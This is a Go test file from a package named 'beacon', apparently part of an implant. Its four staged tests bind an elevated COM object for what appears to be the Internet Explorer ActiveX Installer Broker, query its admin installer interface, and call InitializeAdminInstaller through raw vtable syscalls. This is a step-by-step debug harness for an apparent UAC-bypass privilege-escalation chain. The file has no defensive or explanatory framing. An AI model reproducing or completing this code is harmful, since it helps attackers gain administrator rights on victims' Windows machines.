package beacon

import (
	"fmt"
	"runtime"
	"syscall"
	"testing"
	"unsafe"
)

// A: CoInit + bind IUnknown (proven working baseline)
func TestDbgIE_A(t *testing.T) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procCoInitializeEx.Call(0, 2)
	defer procCoUninitialize.Call()
	p, err := bindElevated("BDB57FF2-79B9-4205-9447-F5FE85F37312", "00000000-0000-0000-C000-000000000046")
	t.Logf("A bind IUnknown -> p=%v err=%v", p, err)
	if p != nil {
		comRelease(p)
	}
	fmt.Println("doneA")
}

// B: A + CoInitializeSecurity before bind
func TestDbgIE_B(t *testing.T) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procCoInitializeEx.Call(0, 2)
	defer procCoUninitialize.Call()
	r, _, _ := procCoInitializeSecurity.Call(0, 0xFFFFFFFF, 0, 0, 2, 3, 0, 0, 0)
	t.Logf("B CoInitSec -> 0x%08x", uint32(r))
	p, err := bindElevated("BDB57FF2-79B9-4205-9447-F5FE85F37312", "00000000-0000-0000-C000-000000000046")
	t.Logf("B bind IUnknown -> p=%v err=%v", p, err)
	if p != nil {
		comRelease(p)
	}
	fmt.Println("doneB")
}

// C: B + QI IEAxiAdminInstaller from IUnknown
func TestDbgIE_C(t *testing.T) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procCoInitializeEx.Call(0, 2)
	defer procCoUninitialize.Call()
	r, _, _ := procCoInitializeSecurity.Call(0, 0xFFFFFFFF, 0, 0, 2, 3, 0, 0, 0)
	t.Logf("C CoInitSec -> 0x%08x", uint32(r))
	p, err := bindElevated("BDB57FF2-79B9-4205-9447-F5FE85F37312", "00000000-0000-0000-C000-000000000046")
	if err != nil {
		t.Fatalf("C bind: %v", err)
	}
	iidAdmin, _ := guidFromString("9AEA8A59-E0C9-40F1-87DD-757061D56177")
	var admin unsafe.Pointer
	r1, _, _ := syscall.Syscall((*struct{ QueryInterface, AddRef, Release uintptr })(p).QueryInterface, 3, uintptr(p), uintptr(unsafe.Pointer(&iidAdmin)), uintptr(unsafe.Pointer(&admin)))
	t.Logf("C QI IEAxiAdminInstaller -> 0x%08x admin=%v", uint32(r1), admin)
	if admin != nil {
		comRelease(admin)
	}
	comRelease(p)
	fmt.Println("doneC")
}

// D: C + InitializeAdminInstaller + QI IEAxiInstaller2
func TestDbgIE_D(t *testing.T) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procCoInitializeEx.Call(0, 2)
	defer procCoUninitialize.Call()
	procCoInitializeSecurity.Call(0, 0xFFFFFFFF, 0, 0, 2, 3, 0, 0, 0)
	p, err := bindElevated("BDB57FF2-79B9-4205-9447-F5FE85F37312", "9AEA8A59-E0C9-40F1-87DD-757061D56177")
	if err != nil {
		t.Fatalf("D bind IEAxiAdmin: %v", err)
	}
	t.Logf("D direct IEAxiAdmin bind OK")
	vtbl := (*ieaAdminBrokerVtbl)(p)
	defer comRelease(p)
	var uuidBstr uintptr
	r1, _, _ := syscall.Syscall9(vtbl.InitializeAdminInstaller, 4, uintptr(p), 0, 0, uintptr(unsafe.Pointer(&uuidBstr)), 0, 0, 0, 0, 0)
	t.Logf("D InitializeAdminInstaller -> 0x%08x uuid=%q", uint32(r1), bstrToString(uuidBstr))
	if uuidBstr != 0 {
		procSysFreeString.Call(uuidBstr)
	}
	fmt.Println("doneD")
}
